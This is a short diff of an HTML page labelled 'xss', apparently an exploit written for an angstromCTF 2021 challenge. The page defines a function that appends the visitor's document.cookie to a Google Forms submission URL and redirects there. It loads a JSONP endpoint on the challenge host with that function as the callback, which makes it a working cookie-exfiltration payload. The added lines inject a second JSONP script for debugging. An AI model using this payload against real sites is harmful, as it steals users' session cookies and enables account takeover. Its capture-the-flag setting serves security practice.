@@ -13,6 +13,12 @@ layout: xss
     function xss_redirect(data){
         document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + data + document.cookie
     }
+    function processWeatherCallback(data) {
+        console.log("DATA" + data);
+    }
+    var script = document.createElement('script');
+    script.src = 'https://jason.2021.chall.actf.co/languages?callback=processWeatherCallback';
+    document.body.appendChild(script);
 </script>
 
 <script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect"></script>
